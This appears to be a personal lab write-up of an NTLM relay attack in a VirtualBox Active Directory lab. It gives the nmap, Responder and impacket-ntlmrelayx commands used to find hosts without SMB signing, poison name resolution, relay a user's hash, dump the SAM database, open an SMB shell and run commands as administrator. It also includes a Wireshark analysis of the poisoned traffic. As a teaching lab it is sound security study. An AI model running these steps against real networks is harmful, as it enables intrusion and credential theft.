Setup:
- Run both windows workstations (THEPUNISHER, SPIDERMAN)
- The user "frank" on THEPUNISHER is also an administrator on SPIDERMAN
- The DC has to run, otherwise we will not be able to logon on SPIDERMAN, as the machine will fail to verify the NTLM hash on the DC. 
---
# Attack outline

**Exploitation steps:**
- Scan the network for hosts
- Identify hosts with SMB signing not required (nmap script: `nmap -Pn --script=smb2-security-mode.nse -p 445 <IP>`)
- Config (disable SMB, HTTP) and run *responder*
- Run *ntlmrelayx* (with the targets identified in point 1)

Responder will pass hashes to ntlmrelayx which will forward them to the target machines.
If the hashes correspond to a user that is present on a target machine (and hopefully be a local admin on that machine) we can run commands on the machine as that user. 

## Scan the network for hosts

Nmap scan shows only our machine (10.0.0.11):
![[Pasted image 20240312165922.png]]
Note: Windows firewall drops ICMP requests.

Scan the network with *arp-scan*:
![[Pasted image 20240312165838.png]]
Now we see the other machines on the network.

>[!Note]
>In the following commands we run nmap with the argument `-Pn`, otherwise nmap will only scan hosts that it was able to enumerate, which didn't work as we saw in the first network scan above (because the windows firewall drops ICMP requests).

Now we can run nmap to see what OS the hosts are running:
```bash
sudo nmap -Pn -O 10.0.0.18-20
```
Results:
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 17:02 CET
Nmap scan report for 10.0.0.18
Host is up (0.00033s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
MAC Address: 08:00:27:2F:48:EE (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|11|2016|10 (94%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2022 (94%), Microsoft Windows 11 21H2 (90%), Microsoft Windows Server 2016 (89%), Microsoft Windows 10 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

Nmap scan report for 10.0.0.19
Host is up (0.00036s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 08:00:27:67:F2:E4 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019 (90%)
OS CPE: cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows 10 1909 (90%), Microsoft Windows Server 2019 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

Nmap scan report for 10.0.0.20
Host is up (0.00047s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5357/tcp open  wsdapi
MAC Address: 08:00:27:5C:37:DD (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10|XP (91%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_xp::sp2
Aggressive OS guesses: Microsoft Windows Server 2019 (91%), Microsoft Windows 10 1909 (90%), Microsoft Windows XP SP2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 12.74 seconds
```

10.0.0.18 is probably the windows server (looking at the open ports)
## Identify hosts with SMB signing not required

Nmap SMB enum script:
```bash
nmap -Pn --script=smb2-security-mode.nse -p 445 10.0.0.18-20
```

From the output we can see that the windows server (10.0.0.18) requires SMB message signing, while the 2 windows workstations (10.0.0.19, 10.0.0.20) do not:
![[Pasted image 20240312171229.png]]
## Config (disable SMB, HTTP) and run responder

Create a *targets.txt* file which contains the IP addresses of the 2 workstations (with SMB signing not required):
```txt
10.0.0.19
10.0.0.20
```

Edit the responder config file */etc/responder/Responder.conf* and switch SMB and HTTP off:
![[Pasted image 20240312172332.png]]

Run responder:
```bash
sudo responder -v -I eth1 -dw
```
SMB and HTTP should now be turned off:
![[Pasted image 20240312172511.png]]
## Run ntlmrelayx

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
```
Args:
`-tf`: targetfile: file that contains targets by hostname or full URL, one per line
`-smb2support`: SMB2 Support

Output:
![[Pasted image 20240312173211.png]]

When we now access our attacker machine in network tab on THEPUNISHER:
![[Pasted image 20240312173511.png]]

We can see that ntlmrelay was able to relay the NTLM hash of *frank* to authenticate us on SPIDERMAN. Since frank is a local administrator on SPIDERMAN, the SAM database was dumped:
![[Pasted image 20240312173658.png]]

### Get a shell

We can also use the argument `-i` (for interactive mode) to gain a shell:
```bash
impacket-ntlmrelayx -tf targets.txt -smb2support -i
```
`-i`: Launch an smbclient, LDAP console or SQL shell instead of executing a command after a successful relay. This console will listen locally on a TCP port and can be reached with for example netcat.

From the output we see that an SBM client shell is listening on our local machine 127.0.0.1 on port 11000:
![[Pasted image 20240312174319.png]]

Connecting to the port with netcat we have an SMB shell:
![[Pasted image 20240312174525.png]]

With the SMB shell we could for example enumerate shares:
![[Pasted image 20240312174802.png]]

### Execute a command

We can also use the argument `-c` to execute a command:
```bash
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```
`-c`: Command to execute on target system (for SMB and RPC).

From the output we see that we authenticated and executed "whoami" as a system administrator:
![[Pasted image 20240312175157.png]]

Note: We could use a command to persist access to the machine, for example by creating an administrative user account on the machine credentials that we supply.


# Optional: Capture LLMNR/NBNS/MDNS packages with wireshark

In order to see the multicast NS resolution via LLMNR/NBNS/MDNS, launch wireshark on THEPUNISHER.

In the network try to access a domain name that doesn't exist, in our case just the random string "piou":
![[Pasted image 20240313105621.png]]

In wireshark we captured the following network traffic:
![[Pasted image 20240313105729.png]]
### DNS

**Packets 1, 2:**
DNS resolution on the DC-DNS server fails

### NBNS

**Packet 3:**
NBNS query on broadcast address (10.0.0.255)
**Packet 6:**
NBNS query response from our attacker machine (10.0.0.11), by responder

### MDNS

**Packets 4, 5:**
MDNS query (IPv4, IPv6)
**Packets 9, 11:**
MDNS query response (IPv4, IPv6)

### LLMNR

**Packets 7, 8:**
LLMNR query (IPv4, IPv6)
**Packets 10, 12:**
LLMNR query response (IPv4, IPv6)

### SMB

**Packets 28+:**
THEPUNISHER (10.0.0.19) talks SMB with our attacker machine (10.0.0.11)
In packet 30 the NTLM hash is send to us.